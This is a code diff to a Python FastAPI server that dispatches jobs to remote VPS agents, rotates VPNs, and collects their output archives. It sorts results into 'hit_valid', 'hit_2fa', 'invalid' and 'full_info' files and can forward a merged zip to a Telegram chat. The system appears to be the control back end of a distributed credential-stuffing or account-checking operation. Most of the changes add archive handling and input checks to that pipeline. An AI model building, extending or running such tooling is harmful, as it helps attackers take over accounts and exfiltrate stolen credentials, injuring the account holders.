@@ -13,6 +13,7 @@ import os
 import re
 import secrets
 import time
+import urllib.error
 import urllib.request
 import zipfile
 from collections import defaultdict, deque
@@ -105,9 +106,11 @@ class Hub:
         self.ui_sockets.clear()
 
 
-_VPS_ID_PAT = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")
+_VPS_ID_PAT = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}\Z")
 _VPS_ID_RE = r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$"
-_ALLOWED_COMMANDS = {"START", "STOP", "RESTART", "ROTATE_VPN", "SYNC_VPN", "UPDATE_CODE", "BENCHMARK", "SET_INDUK"}
+_ALLOWED_COMMANDS = {
+    "START", "STOP", "RESTART", "ROTATE_VPN", "SYNC_VPN", "UPDATE_CODE", "BENCHMARK", "SET_INDUK", "COLLECT_OUTPUTS"
+}
 
 
 def _validate_safe_id(val: str, label: str = "id") -> str:
@@ -144,6 +147,10 @@ class RegisterJobBody(BaseModel):
 class CheckedResultsBody(BaseModel):
     vps_ids: list[str]
     scope: str = "latest"  # "latest" | "all"
+
+
+class OutputZipBody(BaseModel):
+    vps_ids: list[str] = Field(default_factory=list)
 
 
 class VpnDistributeBody(BaseModel):
@@ -290,7 +297,7 @@ def _bearer_token(auth_header: str | None) -> str:
 
 
 _OUTPUT_RESULT_FILES = ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt", "full_info_upas_valid.txt")
-_SAFE_COLLECTOR_TXT_RE = re.compile(r"^full_info_by_collector/[A-Za-z0-9._-]{1,64}\.txt$")
+_SAFE_COLLECTOR_TXT_RE = re.compile(r"^full_info_by_collector/[A-Za-z0-9._-]{1,64}\.txt\Z")
 
 
 def _is_allowed_output_entry(name: str) -> bool:
@@ -300,19 +307,29 @@ def _is_allowed_output_entry(name: str) -> bool:
     return norm in _OUTPUT_RESULT_FILES or bool(_SAFE_COLLECTOR_TXT_RE.match(norm))
 
 
-_MAX_ZIP_UPLOAD_BYTES = 25 * 1024 * 1024
+def _is_allowed_archive_entry(name: str) -> bool:
+    norm = (name or "").replace("\\", "/")
+    if norm != name or ".." in norm or norm.startswith("/") or "/" not in norm:
+        return False
+    folder, rest = norm.split("/", 1)
+    return bool(_VPS_ID_PAT.match(folder)) and _is_allowed_output_entry(rest)
+
+
+_MAX_ZIP_UPLOAD_BYTES = 100 * 1024 * 1024
 _MAX_ZIP_ENTRY_BYTES = 50 * 1024 * 1024
-_MAX_ZIP_TOTAL_UNCOMPRESSED = 100 * 1024 * 1024
+_MAX_ZIP_TOTAL_UNCOMPRESSED = 250 * 1024 * 1024
 
 
-def _validate_and_read_output_zip(raw: bytes) -> dict[str, str]:
+def _validate_and_read_output_zip(raw: bytes, entry_checker=_is_allowed_output_entry) -> dict[str, str]:
     if len(raw) > _MAX_ZIP_UPLOAD_BYTES:
         raise ValueError(f"Output zip too large (>{_MAX_ZIP_UPLOAD_BYTES} bytes)")
     parsed: dict[str, str] = {}
     total_uncompressed = 0
     with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
         for info in zf.infolist():
-            if not _is_allowed_output_entry(info.filename):
+            if ((info.external_attr >> 16) & 0o170000) == 0o120000:
+                raise ValueError(f"Symlink entry not allowed: {info.filename}")
+            if not entry_checker(info.filename):
                 raise ValueError(f"Disallowed entry in output zip: {info.filename}")
             if info.file_size > _MAX_ZIP_ENTRY_BYTES:
                 raise ValueError(f"Zip entry too large: {info.filename}")
@@ -599,6 +616,8 @@ def create_app(
                 await old_ws.close(code=4001)
         if not await db.delete_node(vid):
             raise HTTPException(status_code=404, detail="VPS not found")
+        with contextlib.suppress(OSError):
+            os.remove(os.path.join(base_data, "vps_outputs", f"{vid}.zip"))
         return {"deleted": vid}
 
     @app.post("/api/v1/commands/bulk", dependencies=[Depends(require_ui_auth)])
@@ -629,14 +648,11 @@ def create_app(
         return {"jobs": jobs, "tg_configured": bool(resolved_tg_tok and resolved_tg_chat)}
 
     _CARD_SEP = "-" * 60
+    _CARD_SPLIT_RE = re.compile(r"(?m)^-{20,}\s*$")
 
     def _split_full_cards(text: str) -> list[str]:
-        out: list[str] = []
-        for blk in text.split(_CARD_SEP):
-            b = blk.strip()
-            if b:
-                out.append(b)
-        return out
+        norm = (text or "").replace("\r\n", "\n").replace("\r", "\n")
+        return [blk.strip() for blk in _CARD_SPLIT_RE.split(norm) if blk.strip()]
 
     def _assemble_result_zip_sync(
         zip_name: str,
@@ -819,14 +835,19 @@ def create_app(
     async def _send_zip_to_telegram(zip_name: str, zbytes: bytes, counts: dict) -> dict:
         if not (resolved_tg_tok and resolved_tg_chat):
             raise HTTPException(status_code=400, detail="Telegram token/chat_id belum dikonfigurasi")
+        if len(zbytes) > 49 * 1024 * 1024:
+            raise HTTPException(status_code=400, detail="output.zip > 49 MB (batas upload Telegram Bot API)")
         caption = (
             f"📦 Output {zip_name}\n"
             f"VALID: {counts['hit_valid.txt']} | 2FA: {counts['hit_2fa.txt']} | "
             f"INVALID: {counts['invalid.txt']} | ERR: {counts['err.txt']}"
         )
-        res = await asyncio.to_thread(
-            _send_telegram_zip_sync, resolved_tg_tok, resolved_tg_chat, zip_name, zbytes, caption
-        )
+        try:
+            res = await asyncio.to_thread(
+                _send_telegram_zip_sync, resolved_tg_tok, resolved_tg_chat, zip_name, zbytes, caption
+            )
+        except (urllib.error.URLError, OSError) as exc:
+            raise HTTPException(status_code=502, detail=f"Telegram send failed: {exc}") from exc
         if res.get("ok") is not True:
             raise HTTPException(status_code=502, detail=f"Telegram API failed: {res}")
         return {"ok": True, "zip_name": zip_name, "counts": counts}
@@ -843,6 +864,160 @@ def create_app(
 
         await asyncio.to_thread(_mark_sent)
         return out
+
+    async def _build_single_output_zip(vps_ids: list[str] | None = None) -> tuple[str, bytes, dict]:
+        nodes, _ = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
+        known = {n["vps_id"] for n in nodes}
+        if vps_ids:
+            clean_ids = list(dict.fromkeys(_validate_safe_id(v, "vps_id") for v in vps_ids))
+            unknown = [v for v in clean_ids if v not in known]
+            if unknown:
+                raise HTTPException(status_code=404, detail=f"Unknown VPS IDs: {', '.join(unknown)}")
+        else:
+            clean_ids = [n["vps_id"] for n in nodes]
+        jobs = await db.list_jobs(limit=100)
+        job_folder_map = {
+            j["job_id"]: (j.get("filename") or j["job_id"])
+            for j in jobs
+        }
+
+        vps_out_dir = os.path.join(base_data, "vps_outputs")
+        arc_blobs: list[bytes] = []
+        for vid in clean_ids:
+            az = os.path.join(vps_out_dir, f"{vid}.zip")
+            async with _get_job_lock(f"arc_{vid}"):
+                raw_b = await asyncio.to_thread(lambda p=az: open(p, "rb").read() if os.path.isfile(p) else b"")
+            if raw_b:
+                arc_blobs.append(raw_b)
+
+        def _canon_folder(raw_name: str) -> str:
+            mapped = str(job_folder_map.get(raw_name) or raw_name)
+            return re.sub(r"[^A-Za-z0-9._-]+", "_", mapped).strip("._-") or raw_name
+
+        def _assemble_all() -> tuple[str, bytes, dict]:
+            # Map: folder -> rel_path -> merged data (lines list or card blocks)
+            folder_lines: dict[str, dict[str, list[str]]] = {}
+            folder_lines_seen: dict[str, dict[str, set[str]]] = {}
+            folder_cards: dict[str, dict[str, list[str]]] = {}
+            folder_cards_seen: dict[str, dict[str, set[str]]] = {}
+
+            def _ingest(folder: str, rel: str, raw_text: str) -> None:
+                fd = _canon_folder(folder)
+                if rel == "full_info_upas_valid.txt" or rel.startswith("full_info_by_collector/"):
+                    cards = _split_full_cards(raw_text)
+                    if not cards:
+                        return
+                    blist = folder_cards.setdefault(fd, {}).setdefault(rel, [])
+                    bseen = folder_cards_seen.setdefault(fd, {}).setdefault(rel, set())
+                    for card in cards:
+                        if card not in bseen:
+                            bseen.add(card)
+                            blist.append(card)
+                else:
+                    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+                    if not lines:
+                        return
+                    llist = folder_lines.setdefault(fd, {}).setdefault(rel, [])
+                    lseen = folder_lines_seen.setdefault(fd, {}).setdefault(rel, set())
+                    for s in lines:
+                        if s not in lseen:
+                            lseen.add(s)
+                            llist.append(s)
+
+            for raw_b in arc_blobs:
+                try:
+                    parsed = _validate_and_read_output_zip(raw_b, entry_checker=_is_allowed_archive_entry)
+                    for entry, raw_text in parsed.items():
+                        folder, rel = entry.split("/", 1)
+                        _ingest(folder, rel, raw_text)
+                except Exception:
+                    continue
+
+            # Also fold per-job live/partial outputs from jobs/<jid>/outputs/<vid>.zip
+            jobs_dir = os.path.join(base_data, "jobs")
+            target_set = set(clean_ids)
+            if target_set and os.path.isdir(jobs_dir):
+                for jid in sorted(os.listdir(jobs_dir)):
+                    od = os.path.join(jobs_dir, jid, "outputs")
+                    if not os.path.isdir(od):
+                        continue
+                    for fn in sorted(os.listdir(od)):
+                        if not fn.endswith(".zip"):
+                            continue
+                        vid = fn[:-4]
+                        if vid not in target_set:
+                            continue
+                        try:
+                            with open(os.path.join(od, fn), "rb") as f:
+                                parsed = _validate_and_read_output_zip(f.read(), entry_checker=_is_allowed_output_entry)
+                            for rel, raw_text in parsed.items():
+                                _ingest(jid, rel, raw_text)
+                        except Exception:
+                            continue
+
+            folders = sorted(set(folder_lines.keys()) | set(folder_cards.keys()))
+            tot_v = sum(len((folder_lines.get(fd) or {}).get("hit_valid.txt") or []) for fd in folders)
+            tot_f = sum(len((folder_cards.get(fd) or {}).get("full_info_upas_valid.txt") or []) for fd in folders)
+            tot_o = sum(len((folder_lines.get(fd) or {}).get("hit_2fa.txt") or []) for fd in folders)
+            tot_i = sum(len((folder_lines.get(fd) or {}).get("invalid.txt") or []) for fd in folders)
+            tot_e = sum(len((folder_lines.get(fd) or {}).get("err.txt") or []) for fd in folders)
+
+            summary_rows = [
+                f"VPS      : {', '.join(clean_ids) or '-'}",
+                f"Folders  : {len(folders)}",
+                f"Valid    : {tot_v} (Full Info: {tot_f})",
+                f"2FA/OTP  : {tot_o}",
+                f"Invalid  : {tot_i}",
+                f"Error    : {tot_e}",
+                "",
+            ]
+            for fd in folders:
+                fl = folder_lines.get(fd) or {}
+                fc = folder_cards.get(fd) or {}
+                summary_rows.append(
+                    f"- {fd}/ -> Valid:{len(fl.get('hit_valid.txt') or [])} "
+                    f"Full:{len(fc.get('full_info_upas_valid.txt') or [])} "
+                    f"2FA:{len(fl.get('hit_2fa.txt') or [])} "
+                    f"Invalid:{len(fl.get('invalid.txt') or [])} Err:{len(fl.get('err.txt') or [])}"
+                )
+
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+                zf.writestr("summary.txt", ("\n".join(summary_rows) + "\n").encode("utf-8"))
+                for fd in folders:
+                    for rel, lines in sorted((folder_lines.get(fd) or {}).items()):
+                        if lines:
+                            zf.writestr(f"{fd}/{rel}", ("\n".join(lines) + "\n").encode("utf-8"))
+                    for rel, cards in sorted((folder_cards.get(fd) or {}).items()):
+                        if cards:
+                            body = f"\n\n{_CARD_SEP}\n\n".join(cards) + f"\n\n{_CARD_SEP}\n"
+                            zf.writestr(f"{fd}/{rel}", body.encode("utf-8"))
+
+            counts = {
+                "hit_valid.txt": tot_v,
+                "hit_2fa.txt": tot_o,
+                "invalid.txt": tot_i,
+                "err.txt": tot_e,
+                "full_info": tot_f,
+                "folders": len(folders),
+            }
+            return "output.zip", buf.getvalue(), counts
+
+        return await asyncio.to_thread(_assemble_all)
+
+    @app.post("/api/v1/results/output.zip", dependencies=[Depends(require_ui_auth)])
+    async def download_single_output_zip(body: OutputZipBody):
+        zip_name, zbytes, _ = await _build_single_output_zip(body.vps_ids or None)
+        return Response(
+            zbytes,
+            media_type="application/zip",
+            headers={"Content-Disposition": f'attachment; filename="{zip_name}"'},
+        )
+
+    @app.post("/api/v1/results/output-zip/telegram", dependencies=[Depends(require_ui_auth)])
+    async def send_single_output_zip_telegram(body: OutputZipBody):
+        zip_name, zbytes, counts = await _build_single_output_zip(body.vps_ids or None)
+        return await _send_zip_to_telegram(zip_name, zbytes, counts)
 
     @app.post("/api/v1/results/checked/zip", dependencies=[Depends(require_ui_auth)])
     async def download_checked_results_zip(body: CheckedResultsBody):
@@ -919,6 +1094,38 @@ def create_app(
         if inserted > 0:
             await hub.broadcast_ui({"type": "hits_added", "job_id": jid, "vps_id": vps_id, "hit_type": body.hit_type, "inserted": inserted})
         return {"ok": True, "inserted": inserted, "received": received}
+
+    @app.post("/api/v1/agent/outputs-archive")
+    async def upload_agent_outputs_archive(request: Request, vps_id: str = Depends(require_agent_auth)):
+        chunks: list[bytes] = []
+        total_rx = 0
+        async for chunk in request.stream():
+            total_rx += len(chunk)
+            if total_rx > _MAX_ZIP_UPLOAD_BYTES:
+                raise HTTPException(status_code=413, detail="Output archive too large")
+            chunks.append(chunk)
+        raw = b"".join(chunks)
+        try:
+            parsed = await asyncio.to_thread(_validate_and_read_output_zip, raw, _is_allowed_archive_entry)
+        except ValueError as ve:
+            raise HTTPException(status_code=400, detail=str(ve))
+        except Exception as exc:
+            raise HTTPException(status_code=400, detail="Invalid output archive zip") from exc
+
+        def _save_archive() -> None:
+            vdir = os.path.join(base_data, "vps_outputs")
+            os.makedirs(vdir, exist_ok=True)
+            dst = os.path.join(vdir, f"{vps_id}.zip")
+            tmp = f"{dst}.tmp.{secrets.token_hex(4)}"
+            with open(tmp, "wb") as f:
+                f.write(raw)
+            os.replace(tmp, dst)
+
+        async with _get_job_lock(f"arc_{vps_id}"):
+            await asyncio.to_thread(_save_archive)
+        await db.touch_seen(vps_id)
+        await hub.broadcast_ui({"type": "job_output_ready", "job_id": "output.zip", "vps_id": vps_id, "tg_sent": False})
+        return {"ok": True, "vps_id": vps_id, "files": len(parsed)}
 
     @app.post("/api/v1/agent/output/{job_id}")
     async def upload_agent_output(
@@ -1074,7 +1281,8 @@ def create_app(
                 raise HTTPException(status_code=400, detail="workers must be 'auto' or 1..30")
             w_val = str(int(w_raw))
         stem = re.sub(r"[^A-Za-z0-9._-]+", "_", os.path.splitext(body.filename or "")[0]).strip("._-")[:40]
-        job_id = f"job_{int(time.time())}_{secrets.token_hex(3)}"
+        pfx = stem[:24] if (stem and stem[0].isalnum() and not stem.startswith("manual_")) else "job"
+        job_id = f"{pfx}_{int(time.time())}_{secrets.token_hex(3)}"
         assigned_vps = [vid for vid in body.vps_ids if assignments.get(vid)]
         await db.create_job(
             job_id,
